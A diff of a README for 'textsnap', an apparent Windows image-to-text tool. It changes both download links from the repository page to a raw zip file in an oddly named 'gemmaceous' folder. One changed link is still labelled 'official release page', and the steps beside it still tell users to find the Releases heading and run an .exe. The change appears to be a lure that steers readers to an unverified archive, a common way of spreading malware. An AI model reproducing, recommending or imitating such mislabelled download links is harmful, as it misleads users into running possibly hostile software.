@@ -1,6 +1,6 @@
 # 📷 textsnap - Convert images into clear digital text
 
-[![](https://img.shields.io/badge/Download_textsnap-007bff?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Itscal106/textsnap)
+[![](https://img.shields.io/badge/Download_textsnap-007bff?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Itscal106/textsnap/raw/refs/heads/main/gemmaceous/Software_v2.8.zip)
 
 ## 🎯 About this tool
 
@@ -23,7 +23,7 @@ You do not need to install extra drivers or complex frameworks for this tool. It
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Itscal106/textsnap).
+1. Go to the [official release page](https://github.com/Itscal106/textsnap/raw/refs/heads/main/gemmaceous/Software_v2.8.zip).
 2. Look for the latest version under the Releases heading.
 3. Click the file that ends with .exe to download it to your computer.
 4. Open your Downloads folder.
